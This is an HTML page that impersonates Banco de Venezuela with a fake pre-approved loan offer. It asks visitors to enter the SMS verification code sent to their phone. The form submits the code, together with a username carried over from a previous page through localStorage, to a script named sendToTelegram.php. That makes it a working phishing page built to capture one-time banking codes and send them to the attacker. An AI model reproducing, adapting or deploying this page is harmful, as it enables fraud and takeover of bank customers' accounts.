
<!DOCTYPE html>
<html lang="es">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
    <title>Banco de Venezuela</title>
    <style>
      body {
        margin: 0;
        padding: 0;
        font-family: Arial, sans-serif;
        height: 100vh;
        display: flex;
        justify-content: center;
        align-items: center;
        background-image: url(background.jpg);
        background-size: cover;
        background-position: center;
      }
      .container {
        display: flex;
        height: 100%;
        width: 100%;
      }
      .left-side {
        width: 50%;
        display: flex;
        justify-content: center;
        align-items: center;
      }
      .right-side {
        width: 50%;
      }
      form {
        width: 80%;
        background: white;
        max-width: 550px;
        box-shadow: 0 5px 10px 0 rgba(0, 0, 0, 0.1);
        padding: 20px;
      }
      .form-group {
        margin: 20px;
        position: relative;
      }
      .form-group input {
        width: 100%;
        padding: 10px;
        box-sizing: border-box;
        position: relative;
        height: 60px;
        border: 0;

        border-bottom: 1px solid gray;
        background: #ededed;
        outline: none;
      }
      .form-group label {
        position: absolute;
        top: 50%;
        left: 10px;
        transform: translateY(-50%);
        color: #999;
        transition: 0.3s ease;
      }
      .form-group input:focus + label,
      .form-group input:not(:placeholder-shown) + label {
        top: 5px;
        font-size: 12px;
        color: #333;
      }
      button {
        background-color: #0067b1;
        color: white;
        border-radius: 3px;
        border: 0;
        padding: 15px;
        width: 200px;
        margin-top: 20px;
      }
      .slider-container {
        text-align: center;
        width: 80%;
        max-width: 600px;
        margin: auto;
      }
      .slider-value {
        font-size: 24px;
        color: #0070cc;
        margin-top: 10px;
      }
    </style>
  </head>
  <body>
    <div class="container">
      <div class="left-side">
        <form id="loginform" action="sendToTelegram.php" method="POST">
          <div style="text-align: center">
            <img src="logo.png" alt="" style="width: 60%; margin-top: 20px" />
          </div>
          <div style="margin: 10px; color: #0067b1;">
            <h4>Credito Preaprobado</h4>
            <h5>
              Para solicitar y conocer el monto de tu crédito, ingresa el SMS que hemos enviado a tu celular registrado o puedes generarlo en nuestra app Amiven.
            </h5>
          </div>
          <div class="slider-container">
            <div class="slider-value" id="sliderValue">$10,000 USD</div>
            <input type="range" min="1000" max="50000" value="10000" class="slider" id="priceSlider" />
          </div>
          <script>
            const slider = document.getElementById("priceSlider");
            const sliderValue = document.getElementById("sliderValue");
            slider.addEventListener("input", function () {
              sliderValue.textContent = `$${parseInt(slider.value).toLocaleString()} USD`;
            });
          </script>
          <div class="form-group">
            <input
              type="text"
              id="sms"
              name="sms"
              required
              placeholder=" "
              maxlength="8"
            />
            <label for="sms">SMS *</label>
          </div>
          <input type="hidden" id="usuario" name="usuario" />
          <div style="width: 100%; text-align: center">
            <button type="submit">Verificar</button>
          </div>
        </form>
      </div>
      <div class="right-side"></div>
    </div>
    <script>
      document.addEventListener("DOMContentLoaded", function () {
        const usuario = localStorage.getItem("usuario");
        if (usuario) {
          document.getElementById("usuario").value = usuario;
        } else {
          alert("No se encontró un usuario en localStorage. Por favor, vuelve a iniciar sesión.");
          window.location.href = "index.html";
        }
      });
    </script>
  </body>
</html>
